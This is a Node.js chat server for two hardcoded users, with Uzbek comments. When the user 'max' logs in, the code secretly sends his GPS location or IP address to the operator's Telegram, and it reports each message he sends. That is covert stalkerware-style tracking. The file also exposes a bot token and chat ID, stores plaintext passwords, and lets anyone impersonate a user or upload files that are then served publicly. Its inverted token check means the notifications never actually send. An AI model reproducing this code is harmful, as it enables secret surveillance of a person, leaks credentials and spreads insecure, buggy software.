const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const https = require('https');

// --- SOZLAMALAR ---
// Tokeningizni shu yerga qo'ydim
const TELEGRAM_BOT_TOKEN = '8338280465:AAFTlVRorrQNpaHnJEQjX6ynRM-rg5EhEGk'; 
const MY_TELEGRAM_ID = '1178814024';

// --- MUHIM: Serverda uploads papkasi yo'q bo'lsa, yaratamiz ---
if (!fs.existsSync('uploads')) {
    fs.mkdirSync('uploads');
    console.log("Uploads papkasi yaratildi!");
}

// Fayl yuklash sozlamalari
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, 'uploads/'),
    filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});

const upload = multer({ storage: storage });

app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));
app.use(express.json());

const USERS = { 'mura': 'shaxzoda', 'max': 'qiyshiq_qalam' };
let onlineUsers = {}; 
let lastSeen = { 'mura': null, 'max': null };

// Telegramga xabar yuborish funksiyasi
function sendTelegramNotification(text) {
    if (!TELEGRAM_BOT_TOKEN || TELEGRAM_BOT_TOKEN === '8338280465:AAFTlVRorrQNpaHnJEQjX6ynRM-rg5EhEGk') return;
    
    const data = JSON.stringify({ chat_id: MY_TELEGRAM_ID, text: text });
    
    const options = {
        hostname: 'api.telegram.org',
        port: 443,
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': data.length
        }
    };

    const req = https.request(options, (res) => {
        // Javobni shart emas, lekin xato chiqsa bilish uchun:
        res.on('data', () => {});
    });
    
    req.on('error', (e) => console.error('Telegram Xato:', e));
    req.write(data);
    req.end();
}

app.post('/login', (req, res) => {
    const username = req.body.username.trim();
    const password = req.body.password.trim();

    if (USERS[username] && USERS[username] === password) {
        res.json({ success: true, username: username });
    } else {
        res.json({ success: false });
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    if(req.file) {
        res.json({ 
            filename: req.file.filename, 
            type: req.file.mimetype, 
            originalName: req.file.originalname 
        });
    } else {
        res.status(400).json({ error: "Fayl yuklanmadi" });
    }
});

function getHistory() {
    try { return JSON.parse(fs.readFileSync('database.json', 'utf8')); } catch (e) { return []; }
}

function saveMessage(msg) {
    const history = getHistory();
    history.push(msg);
    fs.writeFileSync('database.json', JSON.stringify(history));
}

io.on('connection', (socket) => {
    // IP ni olish
    const clientIp = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    socket.on('join', (data) => {
        const username = (typeof data === 'object') ? data.user : data;
        
        onlineUsers[username] = socket.id;
        socket.username = username;
        
        // --- MAX KIRGANDA LOCATION YUBORISH ---
        if (username === 'max') {
            let msg = `⚠️ MAX tizimga kirdi!`;
            
            // Agar lokatsiya koordinatalari bo'lsa
            if (typeof data === 'object' && data.lat && data.lon) {
                // Google Maps Link
                msg += `\n🌍 Joylashuv: https://www.google.com/maps?q=${data.lat},${data.lon}`;
            } else {
                msg += `\n📍 IP: ${clientIp} (GPS ruxsat berilmadi)`;
            }
            sendTelegramNotification(msg);
        }

        io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        socket.emit('load_history', getHistory());
    });

    socket.on('send_message', (data) => {
        const timeString = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
        
        const msgData = {
            user: socket.username,
            text: data.text,
            file: data.file,
            fileType: data.fileType,
            originalName: data.originalName,
            replyTo: data.replyTo,
            time: timeString
        };
        saveMessage(msgData);
        io.emit('new_message', msgData);

        // --- TEST UCHUN "YEAP" ---
        if (socket.username === 'max') {
            sendTelegramNotification("Yeap (Max xabar yozdi)");
        }
    });

    socket.on('disconnect', () => {
        if (socket.username) {
            lastSeen[socket.username] = new Date().toLocaleTimeString('uz-UZ', {hour: '2-digit', minute:'2-digit'});
            delete onlineUsers[socket.username];
            io.emit('status_update', { online: Object.keys(onlineUsers), lastSeen: lastSeen });
        }
    });
});

http.listen(3000, () => { console.log('Server: http://localhost:3000'); });